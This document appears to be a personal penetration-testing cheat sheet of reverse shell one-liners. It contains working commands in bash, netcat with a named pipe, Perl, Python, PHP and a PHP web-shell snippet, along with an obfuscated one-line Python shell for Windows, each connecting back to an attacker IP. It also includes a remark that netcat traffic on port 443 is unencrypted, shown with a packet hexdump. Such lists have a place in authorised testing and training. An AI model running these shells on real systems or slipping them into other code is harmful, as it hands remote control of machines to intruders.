# Reverse Shells Stuff
## linux reverse shall using named pipes
```
$ mknod /tmp/backpipe p 
$ /bin/sh 0</tmp/backpipe | nc 192.168.56.101 443 1>/tmp/backpipe
```

## USING PORT 443 WITH REGULAR NETCAT DOES NOT ENCRYPT YOUR SHIT
- below is a hexdump of a pcap oover 443... see any problems here?
- wireshark is misleading on this, because it will identify the protocol as 
SSL based on the port, but the actual data is not encrypted
- counter arg / rationale for still using 443: maybe it's not monitored or more likely to be allowed out
```
0000   0a 00 27 00 00 00 08 00 27 99 b1 5f 08 00 45 00   ..'.....'.±_..E.
0010   00 47 03 d3 40 00 80 06 05 27 c0 a8 38 65 c0 a8   .G.Ó@....'À¨8eÀ¨
0020   38 01 01 bb eb 20 49 67 3a 5d 68 dc 4f 3a 80 18   8..»ë Ig:]hÜO:..
0030   01 03 74 67 00 00 01 01 08 0a 00 13 91 d5 65 20   ..tg.........Õe 
0040   79 25 63 61 74 20 73 75 72 69 2d 72 75 6c 65 73   y%cat suri-rules
0050   2e 74 78 74 0a                                    .txt.
```

## comman reverse shells
- bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
- perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- php
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

<?php exec("bash -i >& /dev/tcp/10.10.14.11/6666 0>&1") ?>
```

- python on windows : i don't remember where tf this even came from
```
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

